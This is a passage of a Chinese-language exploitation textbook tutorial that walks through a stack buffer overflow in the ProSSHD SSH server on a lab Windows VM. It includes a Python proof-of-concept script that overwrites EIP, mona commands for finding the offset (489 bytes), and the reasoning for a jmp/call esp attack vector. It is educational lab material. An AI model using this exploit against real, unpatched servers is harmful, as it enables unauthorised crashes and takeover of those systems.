

## 控制指令指针

在 Kali Linux 虚拟机中打开你喜欢的编辑器，创建以下脚本，并将其保存为 prosshd1.py，以验证服务器的漏洞：

![](img/5f597c6a70133069118d9e804ace3775_342_0.png)

NOTE 此脚本需要 paramiko 和 scpclient 模块。paramiko 模块应该已经安装，但你需要验证你的 Kali 版本是否包含 scpclient。如果你尝试运行以下脚本并收到关于 scpclient 的错误，你需要从 https://pypi.python.org/packages/source/s/scpclient/scpclient-0.4.tar.gz 下载并运行 scpclient 模块的 setup.py。你还需要从 Kali Linux 命令行 shell 中使用默认 SSH 客户端连接一次，以便将易受攻击的目标服务器添加到已知 SSH 主机列表中。你需要在运行 ProSSHD 的目标 Windows 虚拟机上创建一个用户账户，该账户将用于你的漏洞利用。我们使用用户名 test1 与密码 asdf。创建该账户或类似的账户并用于此练习。

```
# prosshd1.py
# Based on original Exploit by S2 Crew [Hungary]
import paramiko
from scpclient import *
from contextlib import closing
from time import sleep
import struct

hostname = "192.168.10.104"
username = "test1"
password = "asdf"
req = "A" * 500

ssh_client = paramiko.SSHClient()
ssh_client.load_system_host_keys()
ssh_client.connect(hostname, username=username, key_filename=None,
password=password)
sleep(15)
with closing(Read(ssh_client.get_transport(), req)) as scp:
    scp.receive("foo.txt")
```

此脚本将从你的攻击主机运行，指向目标（在 VMware 中运行）。

![](img/5f597c6a70133069118d9e804ace3775_343_0.png)

NOTE 请记住更改 IP 地址以匹配你的易受攻击服务器，并验证你已在 Windows VM 上创建了 test1 用户账户。

事实证明，在这种情况下，漏洞存在于子进程 wsshd.exe 中，该进程仅在与服务器有活动连接时才存在。因此，我们需要启动漏洞利用，然后快速附加调试器以继续分析。这就是为什么 sleep() 函数使用 15 秒的参数，给我们留出附加的时间。在 VMware 机器内，你可以通过选择 File | Attach 将调试器附加到易受攻击的程序。选择 wsshd.exe 进程，然后单击 Attach 按钮启动调试器。

![](img/5f597c6a70133069118d9e804ace3775_343_1.png)

NOTE 将 Attach 屏幕按 Name 列排序可能有助于快速找到进程。如果你需要更多时间来附加，可以增加传递给 sleep() 函数的秒数。

开始吧！从 Kali 使用以下命令启动攻击脚本，然后快速切换到 VMware 目标，并将 Immunity Debugger 附加到 wsshd.exe：

```
#python prosshd1.py
```

![](img/5f597c6a70133069118d9e804ace3775_343_2.png)

一旦调试器启动并加载进程，按 F9 以“继续”程序。此时，漏洞利用应该已被传递，调试器右下角应该变为黄色并显示“Paused”。根据你用作目标的 Windows 版本，调试器可能要求你在第一次暂停后再次按 F9。因此，如果你不如所示在 EIP 寄存器中看到 0x41414141，请再次按 F9。通常将攻击窗口放置在可以查看调试器右下角的位置很有用，以便查看调试器何时暂停。

```
EBX 00000016C
ESP 0012EF88 ASCII "AAAAAAAA/foo.txt"
EBP 0012F3A4
ESI 76A635B7 kernel32.CreatePipe
EDI 0012F3A0
EIP 41414141
[16:22:22] Access violation when executing [41414141]
```

如你所见，我们控制了 EIP，现在它持有 0x41414141。

## 确定偏移量

接下来，你需要使用 Corelan Team 的 mona.py PyCommand 插件生成一个模式，以确定我们获得控制权的字节数。要获取 mona.py，请访问 https://github.com/corelan/mona 并下载该工具的最新副本。将其保存到 Immunity Debugger 文件夹下的 PyCommands 文件夹中。我们将使用从 Metasploit 移植过来的模式脚本。我们首先要设置工作目录，Mona 生成的输出将写入该目录。因此，启动一个 Immunity Debugger 实例。此时不需要加载程序。单击调试器窗口底部的 Python 命令行 shell，然后输入此处所示的命令：

```
!mona config -set workingfolder c:\grayhat\mona_logs\%p
```

如果 Immunity Debugger 跳转到日志窗口，你可以单击功能区上的“c”按钮返回主 CPU 窗口。现在我们必须生成一个 500 字节的模式用于我们的脚本。从 Immunity Debugger Python 命令行 shell 输入：

```
!mona pc 500
```

这将生成一个 500 字节的模式，并将其存储在你告诉 Mona 写入输出的新文件夹和文件中。检查 C:\grayhat\mona_logs\ 目录，看是否有新文件夹，可能名为 _no_name。该目录中应该有一个名为 pattern.txt 的新文件。这是你想要复制生成模式的文件。正如 Mona 所告诉你的，不要从 Immunity Debugger 的日志窗口复制模式，因为它可能被截断。

在 Kali Linux 虚拟机上保存 prosshd1.py 攻击脚本的新副本（本示例使用名称 prosshd2.py）。从 pattern.txt 文件复制 ASCII 模式，并更改 req 行以包含它，如下所示：

```
# prosshd2.py
...truncated...
req =
"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6
Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3A
f4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai
1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8
Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5A
n6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2A
q3Aq4Aq5Aq"
...truncated...
```

![](img/5f597c6a70133069118d9e804ace3775_345_0.png)

NOTE 复制时，模式将是一行非常长的文本。我们在此处对所示行进行了格式化，以便适应打印页面。

在 Kali Linux 终端窗口中使用 python prosshd2.py 运行新脚本。结果如下所示。

![](img/5f597c6a70133069118d9e804ace3775_345_1.png)

这次，正如预期的那样，调试器捕获了异常，EIP 包含模式的一部分值（41337141）。另外，请注意扩展栈指针（ESP）指向模式的一部分。

使用 Mona 中的模式偏移命令来确定 EIP 的偏移量，如下所示。

```
OBADFOOD [+] Command used:
OBADFOOD !mona po Aq3A
OBADFOOD Looking for Aq3A in pattern of 5000000 bytes
OBADFOOD - Pattern Aq3A found in cyclic pattern at position 489
OBADFOOD Looking for Aq3A in pattern of 5000000 bytes
OBADFOOD - Pattern eA3qA not found in cyclic pattern <uppercase>
OBADFOOD Looking for Aq3A in pattern of 5000000 bytes
OBADFOOD - Pattern A3qA not found in cyclic pattern <lowercase>
OBADFOOD
OBADFOOD [+] This mona.py action took 0:00:00.219000
!mona po Aq3A
```

你可以看到，在缓冲区的前 489 字节后，我们用 41337141 覆盖了字节 490 到 493 的返回指针。在查看 Immunity Debugger 的 Stack 部分时可以看到这一点。然后，在字节 493 之后的 4 字节，缓冲区的其余部分可以在程序崩溃后位于栈顶。我们刚刚用 Mona 使用的 Metasploit 模式偏移工具显示的是模式开始之前的偏移量。

## 确定攻击向量

在 Windows 系统上，栈位于较低的内存地址。这给我们在 Linux 漏洞利用中使用的 Aleph 1 攻击技术带来了问题。与 meet.exe 程序的现成场景不同，对于真实世界的漏洞利用，我们不能仅仅通过栈上的返回地址来控制 EIP。该地址可能以 0x00 开头，当我们将该 NULL 字节传递给易受攻击的程序时会给我们带来问题。

在 Windows 系统上，你将不得不找到另一个攻击向量。通常，当 Windows 程序崩溃时，你会在某个寄存器中找到你的缓冲区（如果不是全部）。如前一节所示，我们控制程序崩溃处的栈区域。我们所需要做的是将 shellcode 放置从字节 493 开始，并用 jmp 或 call esp 的操作码地址覆盖返回指针。我们选择此攻击向量是因为这两个操作码中的任何一个都会将 ESP 的值放入 EIP 并执行该地址处的代码。另一个选项是找到一条执行 push esp 后跟 ret 的指令序列。

要查找所需操作码的地址，我们需要搜索与 ProSSHD 程序动态链接的加载模块（DLL）。请记住，在 Immunity Debugger 内，你可以通过按 ALT-E 列出链接的模块。我们将使用 Mona 工具来搜索加载的模块。首先，我们将使用 Mona 确定哪些模块不参与利用缓解控制，例如 /REBASE 和地址空间布局随机化（ASLR）。第三方应用程序捆绑的模块通常不参与其中一些或全部控制。为了找出我们想要作为漏洞利用一部分使用的模块，我们将在 Immunity Debugger 内部运行 !mona modules 命令。你也可以使用 !mona modules -o 来排除操作系统模块。我们之前使用 Immunity Debugger 附加的 wsshd.exe 实例应该仍然在运行，显示 EIP 中的先前模式。如果它不再运行，请再次运行前面的步骤，附加到 wsshd.exe 进程。调试器已附加到进程后，运行以下命令以获得相同的结果：

```
!mona modules
```

